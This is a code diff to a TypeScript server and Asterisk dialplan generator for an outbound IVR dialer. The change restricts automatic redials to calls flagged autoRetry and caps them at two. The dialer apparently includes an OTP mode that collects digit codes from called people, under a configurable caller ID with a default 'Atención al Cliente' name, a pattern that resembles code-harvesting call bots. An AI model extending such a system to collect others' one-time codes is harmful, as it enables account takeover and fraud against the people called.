@@ -2479,9 +2479,10 @@ export function generateCleanDialplanConf(
     });
 
     block += ` same => n(${labelEnd}),NoOp(=== [CALL END] Destino: ${destVar} | DIALSTATUS=\${DIALSTATUS} | HANGUPCAUSE=\${HANGUPCAUSE} ===)\n`;
+    block += ` same => n,GotoIf($["\${AUTO_RETRY}" != "1"]?no_retry_${tag})\n`;
     block += ` same => n,GotoIf($["\${DB(call_status/${destVar})}" = "operator_hangup" | "\${DB(call_status/${destVar})}" = "ended" | "\${DB(ivr_vars/${destVar}_cancelled)}" = "1"]?no_retry_${tag})\n`;
     block += ` same => n,ExecIf($["\${DIALSTATUS}" = "NOANSWER" | "\${DIALSTATUS}" = "TIMEOUT" | "\${DIALSTATUS}" = "BUSY"]?System(curl -s "http://127.0.0.1:3000/api/asterisk/call/retry?number=${destVar}&cause=\${DIALSTATUS}" &))\n`;
-    block += ` same => n(no_retry_${tag}),NoOp(=== [RETRY OMITIDO] Operador colgo la llamada o llamada ya finalizada ===)\n`;
+    block += ` same => n(no_retry_${tag}),NoOp(=== [RETRY OMITIDO] Reintento no autorizado o llamada finalizada ===)\n`;
     block += ` same => n,Hangup()\n\n`;
     return block;
   };
@@ -3331,7 +3332,8 @@ export function generateCleanDialplanConf(
   dialplanContent += ` same => n,Wait(1)\n`;
   dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
   dialplanContent += ` same => n,Set(AMD_ACTIVE=\${DB(ivr_vars/amd_enabled)})\n`;
-  dialplanContent += ` same => n,GotoIf($["\${AMD_ACTIVE}" = "0" || "\${AMD_ACTIVE}" = "disabled" || "\${AMD_ACTIVE}" = "off"]?skip_amd_press1)\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AMD_ENABLED}" != ""]?Set(AMD_ACTIVE=\${AMD_ENABLED}))\n`;
+  dialplanContent += ` same => n,GotoIf($["\${AMD_ACTIVE}" = "0" | "\${AMD_ACTIVE}" = "disabled" | "\${AMD_ACTIVE}" = "off" | "\${AMD_ACTIVE}" = ""]?skip_amd_press1)\n`;
   dialplanContent += ` same => n,NoOp(=== [AMD-DETECTION] Analizando llamada hacia \${TARGET_DEST} para detectar operadora o grabadora ===)\n`;
   dialplanContent += ` same => n,AMD()\n`;
   dialplanContent += ` same => n,NoOp(=== [AMD-DETECTION] Destino: \${TARGET_DEST} | AMDSTATUS=\${AMDSTATUS} | AMDCAUSE=\${AMDCAUSE} ===)\n`;
@@ -3369,10 +3371,13 @@ export function generateCleanDialplanConf(
   dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_NUM})=timeout)\n`;
   dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${TARGET_NUM}&status=timeout&channel=\${CHANNEL}" &)\n`;
   dialplanContent += ` same => n,Hangup()\n\n`;
-  dialplanContent += ` same => n(amd_machine_press1),NoOp(=== [AMD-OPERADORA] Operadora automatica o contestador detectado en \${TARGET_DEST} -> Colgando y reintentando ===)\n`;
+  dialplanContent += ` same => n(amd_machine_press1),NoOp(=== [AMD-OPERADORA] Operadora automatica o contestador detectado en \${TARGET_DEST} -> Colgando ===)\n`;
   dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_DEST})=machine_detected)\n`;
   dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${TARGET_DEST}&status=machine_detected&cause=\${AMDCAUSE}&channel=\${CHANNEL}" &)\n`;
+  dialplanContent += ` same => n,GotoIf($["\${AUTO_RETRY}" != "1"]?no_retry_amd_press1)\n`;
+  dialplanContent += ` same => n,GotoIf($["\${DB(call_status/\${TARGET_DEST})}" = "operator_hangup" | "\${DB(call_status/\${TARGET_DEST})}" = "ended" | "\${DB(ivr_vars/\${TARGET_DEST}_cancelled)}" = "1"]?no_retry_amd_press1)\n`;
   dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/call/retry?number=\${TARGET_DEST}&cause=\${AMDCAUSE}" &)\n`;
+  dialplanContent += ` same => n(no_retry_amd_press1),NoOp(=== [AMD RETRY OMITIDO] Reintento no autorizado o llamada finalizada ===)\n`;
   dialplanContent += ` same => n,Hangup()\n\n`;
 
   dialplanContent += `; CUANDO EL CLIENTE PRESIONA 1: NOTIFICACION INMEDIATA AL PANEL Y TRANSFERENCIA AL ASESOR\n`;
@@ -3431,7 +3436,8 @@ export function generateCleanDialplanConf(
   dialplanContent += ` same => n,Wait(1)\n`;
   dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})\n`;
   dialplanContent += ` same => n,Set(AMD_ACTIVE=\${DB(ivr_vars/amd_enabled)})\n`;
-  dialplanContent += ` same => n,GotoIf($["\${AMD_ACTIVE}" = "0" || "\${AMD_ACTIVE}" = "disabled" || "\${AMD_ACTIVE}" = "off"]?skip_amd_otp)\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AMD_ENABLED}" != ""]?Set(AMD_ACTIVE=\${AMD_ENABLED}))\n`;
+  dialplanContent += ` same => n,GotoIf($["\${AMD_ACTIVE}" = "0" | "\${AMD_ACTIVE}" = "disabled" | "\${AMD_ACTIVE}" = "off" | "\${AMD_ACTIVE}" = ""]?skip_amd_otp)\n`;
   dialplanContent += ` same => n,NoOp(=== [AMD-DETECTION] Analizando llamada hacia \${TARGET_DEST} para detectar operadora o grabadora ===)\n`;
   dialplanContent += ` same => n,AMD()\n`;
   dialplanContent += ` same => n,NoOp(=== [AMD-DETECTION] Destino: \${TARGET_DEST} | AMDSTATUS=\${AMDSTATUS} | AMDCAUSE=\${AMDCAUSE} ===)\n`;
@@ -3614,10 +3620,13 @@ export function generateCleanDialplanConf(
   dialplanContent += `exten => _XXXXXXX,1,Set(USER_DIGITS=\${EXTEN})\n`;
   dialplanContent += ` same => n,Goto(s,otp_confirm)\n`;
   dialplanContent += `exten => _XXXXXXXX,1,Set(USER_DIGITS=\${EXTEN})\n`;
-  dialplanContent += ` same => n(amd_machine_otp),NoOp(=== [AMD OPERADORA DETECTADA] Grabadora o contestador en \${TARGET_DEST} -> Colgando y reintentando ===)\n`;
+  dialplanContent += ` same => n(amd_machine_otp),NoOp(=== [AMD OPERADORA DETECTADA] Grabadora o contestador en \${TARGET_DEST} -> Colgando ===)\n`;
   dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_DEST})=machine_detected)\n`;
   dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${TARGET_DEST}&status=machine_detected&cause=\${AMDCAUSE}&channel=\${CHANNEL}" &)\n`;
+  dialplanContent += ` same => n,GotoIf($["\${AUTO_RETRY}" != "1"]?no_retry_amd_otp)\n`;
+  dialplanContent += ` same => n,GotoIf($["\${DB(call_status/\${TARGET_DEST})}" = "operator_hangup" | "\${DB(call_status/\${TARGET_DEST})}" = "ended" | "\${DB(ivr_vars/\${TARGET_DEST}_cancelled)}" = "1"]?no_retry_amd_otp)\n`;
   dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/call/retry?number=\${TARGET_DEST}&cause=\${AMDCAUSE}" &)\n`;
+  dialplanContent += ` same => n(no_retry_amd_otp),NoOp(=== [AMD RETRY OMITIDO] Reintento no autorizado o llamada finalizada ===)\n`;
   dialplanContent += ` same => n,Hangup()\n\n`;
 
   dialplanContent += `exten => h,1,NoOp(=== [IVR-OTP HANGUP] Cliente colgo canal: \${CHANNEL} | Causa: \${HANGUPCAUSE} ===)\n`;
@@ -4478,12 +4487,19 @@ app.post('/api/asterisk/call/originate', async (req, res) => {
       ? agentExten
       : (press1DestinationMode === 'ringall' ? 'ringall' : press1SelectedExtensions.join('&'));
 
-    // Save payload for automatic retry on answering machine detection or no answer
-    lastOriginatePayloads.set(cleanDest, { ...req.body, agentExten: effectiveAgentExten });
-    lastOriginatePayloads.set(formattedDest, { ...req.body, agentExten: effectiveAgentExten });
-    // This initial call counts as attempt 1 of maximum 2
-    callRetryAttempts.set(cleanDest, 1);
-    callRetryAttempts.set(formattedDest, 1);
+    // Save payload for automatic retry ONLY if explicitly requested (e.g. mass campaign with AMD active)
+    const shouldAutoRetry = req.body.autoRetry === true || req.body.autoRetry === 'true' || req.body.autoRetry === 1;
+    if (shouldAutoRetry) {
+      lastOriginatePayloads.set(cleanDest, { ...req.body, agentExten: effectiveAgentExten, autoRetry: true });
+      lastOriginatePayloads.set(formattedDest, { ...req.body, agentExten: effectiveAgentExten, autoRetry: true });
+      callRetryAttempts.set(cleanDest, 1);
+      callRetryAttempts.set(formattedDest, 1);
+    } else {
+      lastOriginatePayloads.delete(cleanDest);
+      lastOriginatePayloads.delete(formattedDest);
+      callRetryAttempts.delete(cleanDest);
+      callRetryAttempts.delete(formattedDest);
+    }
 
     const cleanCarrier = (carrier || '').trim();
 
@@ -4636,6 +4652,10 @@ app.post('/api/asterisk/call/originate', async (req, res) => {
       __TARGET_NUM: cleanDest,
       __TARGET_DEST: cleanDest,
       __CALL_DEST: cleanDest,
+      AUTO_RETRY: shouldAutoRetry ? '1' : '0',
+      __AUTO_RETRY: shouldAutoRetry ? '1' : '0',
+      AMD_ENABLED: isAmdEnabled ? '1' : '0',
+      __AMD_ENABLED: isAmdEnabled ? '1' : '0',
       IVR_AGENT_EXTEN: effectiveAgentExten || 'ringall',
       IVR_MODE: mode || 'press1',
       ASSIGNED_CARRIER: (cleanCarrier && cleanCarrier !== 'auto' && cleanCarrier !== 'pool') ? cleanCarrier : '',
@@ -6823,107 +6843,40 @@ app.all('/api/asterisk/call/retry', async (req, res) => {
       });
     }
     
-    // An initial dial counts as attempt 1. A retry brings total dials to 2.
+    // CRITICAL: ONLY allow auto-retry if this call was originated with autoRetry: true!
+    // Manual softphone dials, ad-hoc single tests, or campaigns without auto-retry MUST NEVER re-dial automatically!
+    const payload = lastOriginatePayloads.get(clean10) || lastOriginatePayloads.get(formattedDest) || lastOriginatePayloads.get(number);
+    if (!payload || !payload.autoRetry) {
+      console.log(`[RETRY IGNORED] No hay orden de autoRetry para ${clean10}. Llamada manual o reintento no autorizado.`);
+      return res.json({
+        success: true,
+        message: 'Reintento omitido: esta llamada no tiene autoRetry habilitado.',
+        retrying: false,
+      });
+    }
+
+    // STRICT LIMIT: The initial call was Attempt 1. This retry is Attempt 2.
+    // Absolutely NO more than 2 calls total (1 initial + 1 retry).
+    const MAX_ALLOWED_DIALS = 2;
     const currentAttempts = (callRetryAttempts.get(clean10) || 1) + 1;
     callRetryAttempts.set(clean10, currentAttempts);
     callRetryAttempts.set(number, currentAttempts);
     callRetryAttempts.set(formattedDest, currentAttempts);
 
-    const MAX_ALLOWED_DIALS = 2; // Strict limit requested: "solo debe de marcarla 2 veces no mas de ahi"
-    const payload = lastOriginatePayloads.get(clean10) || lastOriginatePayloads.get(formattedDest) || lastOriginatePayloads.get(number) || {
-      destination: number,
-      carrier: 'auto',
-      mode: 'press1',
-      agentExten: '1001',
-    };
-
-    if (currentAttempts <= MAX_ALLOWED_DIALS) {
-      console.log(`[RETRY SYSTEM] Destino ${number}: No contestó o contestador detectado (${cause}). Marcación #${currentAttempts} de ${MAX_ALLOWED_DIALS} permitidas. Reintentando en 5 segundos...`);
-
-      const causeDescription = (cause === 'AMD_MACHINE' || cause === 'MAX_WORDS' || cause === 'LONG_GREETING')
-        ? `Grabadora/Contestador detectado (${cause})`
-        : `Cliente no contestó (${cause})`;
-
-      const retryState: CallState = {
-        number: clean10,
-        channel: '',
-        status: 'retrying' as any,
-        cause: `${causeDescription} - Reintentando por última vez (Llamada ${currentAttempts} de ${MAX_ALLOWED_DIALS} máximas)`,
-        agent: payload.agentExten || '1001',
-        agentName: (payload.agentExten === 'ringall' || payload.agentExten === 'all')
-          ? '⚡ Todas las Extensiones (Ring-All)'
-          : `Ext. ${payload.agentExten || '1001'}`,
-        startTime: Date.now(),
-        timestamp: Date.now(),
-        duration: 0,
-      };
-
-      callStatusStore.set(number, retryState);
-      callStatusStore.set(clean10, retryState);
-      callStatusStore.set(formattedDest, retryState);
-
-      // Programar reintento automático tras 5 segundos de enfriamiento
-      const retryTimer = setTimeout(async () => {
-        try {
-          // Check if retry was cancelled before executing
-          if (!pendingRetryTimers.has(clean10) && !pendingRetryTimers.has(number) && !pendingRetryTimers.has(formattedDest)) {
-            console.log(`[RETRY ABORTED] Reintento cancelado por el operador para ${clean10}.`);
-            return;
-          }
-          pendingRetryTimers.delete(clean10);
-          pendingRetryTimers.delete(number);
-          pendingRetryTimers.delete(formattedDest);
-
-          console.log(`[RETRY EXECUTE] Lanzando llamada final #${currentAttempts} (máximo ${MAX_ALLOWED_DIALS}) para ${clean10}...`);
-          const channel = `Local/${formattedDest}@from-internal/n`;
-          const targetContext = (payload.mode === 'otp') ? 'ivr-otp' : (payload.mode === 'hybrid' ? 'ivr-hybrid' : 'ivr-press1');
-          const effectiveCidNum = (payload.callerIdNum || payload.callerId || '+18005550199').trim();
-          const effectiveCidName = (payload.callerIdName || 'Atención al Cliente').trim();
-          const originateCallerId = `"${effectiveCidName}" <${effectiveCidNum}>`;
-          const originateVars: Record<string, string> = {
-            TARGET_DEST: clean10,
-            CALL_DEST: clean10,
-            TARGET_NUM: clean10,
-            __TARGET_NUM: clean10,
-            __TARGET_DEST: clean10,
-            __CALL_DEST: clean10,
-            IVR_AGENT_EXTEN: payload.agentExten || '1001',
-            IVR_MODE: payload.mode || 'press1',
-            ASSIGNED_CARRIER: payload.carrier && payload.carrier !== 'auto' ? payload.carrier : '',
-            OUTBOUND_CARRIER: payload.carrier && payload.carrier !== 'auto' ? payload.carrier : '',
-          };
-
-          const fastResult = await amiFastOriginate(channel, targetContext, 's', originateCallerId, originateVars);
-          if (!fastResult.success) {
-            fallbackOriginate(channel, targetContext, 's', originateCallerId, originateVars);
-          }
-        } catch (err: any) {
-          console.warn(`[RETRY EXCEPTION] Error al originar reintento a ${number}:`, err.message);
-        }
-      }, 5000);
-
-      pendingRetryTimers.set(clean10, retryTimer);
-      pendingRetryTimers.set(number, retryTimer);
-      pendingRetryTimers.set(formattedDest, retryTimer);
-
-      return res.json({
-        success: true,
-        message: `${causeDescription}. Se programó la llamada final (intento ${currentAttempts} de ${MAX_ALLOWED_DIALS} permitidos) en 5 segundos.`,
-        retrying: true,
-        attempt: currentAttempts,
-        maxRetries: MAX_ALLOWED_DIALS,
-      });
-    } else {
-      console.log(`[STRICT 2-DIALS LIMIT] Destino ${number}: Se alcanzó el límite estricto de ${MAX_ALLOWED_DIALS} marcaciones sin contestar. No se volverá a marcar.`);
+    if (currentAttempts > MAX_ALLOWED_DIALS) {
+      console.log(`[STRICT 2-DIALS LIMIT] Destino ${clean10}: Se alcanzó el límite estricto de ${MAX_ALLOWED_DIALS} marcaciones. Marcación detenida.`);
       callRetryAttempts.delete(clean10);
       callRetryAttempts.delete(formattedDest);
       callRetryAttempts.delete(number);
-      
+      lastOriginatePayloads.delete(clean10);
+      lastOriginatePayloads.delete(formattedDest);
+      lastOriginatePayloads.delete(number);
+
       const endedState: CallState = {
         number: clean10,
         channel: '',
         status: 'ended',
-        cause: `Cliente no contestó tras ${MAX_ALLOWED_DIALS} llamadas realizadas (${cause}). Marcación detenida.`,
+        cause: `Cliente no contestó tras ${MAX_ALLOWED_DIALS} marcaciones (${cause}). Marcación detenida.`,
         timestamp: Date.now(),
       };
       callStatusStore.set(number, endedState);
@@ -6938,6 +6891,91 @@ app.all('/api/asterisk/call/retry', async (req, res) => {
         maxDials: MAX_ALLOWED_DIALS,
       });
     }
+
+    // Immediately remove payload so no 3rd call can ever be triggered
+    lastOriginatePayloads.delete(clean10);
+    lastOriginatePayloads.delete(formattedDest);
+    lastOriginatePayloads.delete(number);
+
+    console.log(`[RETRY SYSTEM] Destino ${clean10}: No contestó o contestador detectado (${cause}). Marcación #${currentAttempts} de ${MAX_ALLOWED_DIALS} permitidas. Reintentando en 5 segundos...`);
+
+    const causeDescription = (cause === 'AMD_MACHINE' || cause === 'MAX_WORDS' || cause === 'LONG_GREETING')
+      ? `Grabadora/Contestador detectado (${cause})`
+      : `Cliente no contestó (${cause})`;
+
+    const retryState: CallState = {
+      number: clean10,
+      channel: '',
+      status: 'retrying' as any,
+      cause: `${causeDescription} - Reintentando por última vez (Llamada ${currentAttempts} de ${MAX_ALLOWED_DIALS} máximas)`,
+      agent: payload.agentExten || '1001',
+      agentName: (payload.agentExten === 'ringall' || payload.agentExten === 'all')
+        ? '⚡ Todas las Extensiones (Ring-All)'
+        : `Ext. ${payload.agentExten || '1001'}`,
+      startTime: Date.now(),
+      timestamp: Date.now(),
+      duration: 0,
+    };
+
+    callStatusStore.set(number, retryState);
+    callStatusStore.set(clean10, retryState);
+    callStatusStore.set(formattedDest, retryState);
+
+    // Programar reintento automático tras 5 segundos de enfriamiento
+    const retryTimer = setTimeout(async () => {
+      try {
+        // Check if retry was cancelled before executing
+        if (!pendingRetryTimers.has(clean10) && !pendingRetryTimers.has(number) && !pendingRetryTimers.has(formattedDest)) {
+          console.log(`[RETRY ABORTED] Reintento cancelado por el operador para ${clean10}.`);
+          return;
+        }
+        pendingRetryTimers.delete(clean10);
+        pendingRetryTimers.delete(number);
+        pendingRetryTimers.delete(formattedDest);
+
+        console.log(`[RETRY EXECUTE] Lanzando llamada final #${currentAttempts} (máximo ${MAX_ALLOWED_DIALS}) para ${clean10}...`);
+        const channel = `Local/${formattedDest}@from-internal/n`;
+        const targetContext = (payload.mode === 'otp') ? 'ivr-otp' : (payload.mode === 'hybrid' ? 'ivr-hybrid' : 'ivr-press1');
+        const effectiveCidNum = (payload.callerIdNum || payload.callerId || '+18005550199').trim();
+        const effectiveCidName = (payload.callerIdName || 'Atención al Cliente').trim();
+        const originateCallerId = `"${effectiveCidName}" <${effectiveCidNum}>`;
+        const originateVars: Record<string, string> = {
+          TARGET_DEST: clean10,
+          CALL_DEST: clean10,
+          TARGET_NUM: clean10,
+          __TARGET_NUM: clean10,
+          __TARGET_DEST: clean10,
+          __CALL_DEST: clean10,
+          AUTO_RETRY: '0',
+          __AUTO_RETRY: '0',
+          AMD_ENABLED: isAmdEnabled ? '1' : '0',
+          __AMD_ENABLED: isAmdEnabled ? '1' : '0',
+          IVR_AGENT_EXTEN: payload.agentExten || '1001',
+          IVR_MODE: payload.mode || 'press1',
+          ASSIGNED_CARRIER: payload.carrier && payload.carrier !== 'auto' ? payload.carrier : '',
+          OUTBOUND_CARRIER: payload.carrier && payload.carrier !== 'auto' ? payload.carrier : '',
+        };
+
+        const fastResult = await amiFastOriginate(channel, targetContext, 's', originateCallerId, originateVars);
+        if (!fastResult.success) {
+          fallbackOriginate(channel, targetContext, 's', originateCallerId, originateVars);
+        }
+      } catch (err: any) {
+        console.warn(`[RETRY EXCEPTION] Error al originar reintento a ${number}:`, err.message);
+      }
+    }, 5000);
+
+    pendingRetryTimers.set(clean10, retryTimer);
+    pendingRetryTimers.set(number, retryTimer);
+    pendingRetryTimers.set(formattedDest, retryTimer);
+
+    return res.json({
+      success: true,
+      message: `${causeDescription}. Se programó la llamada final (intento ${currentAttempts} de ${MAX_ALLOWED_DIALS} permitidos) en 5 segundos.`,
+      retrying: true,
+      attempt: currentAttempts,
+      maxRetries: MAX_ALLOWED_DIALS,
+    });
   } catch (error: any) {
     res.status(500).json({ success: false, error: error.message });
   }
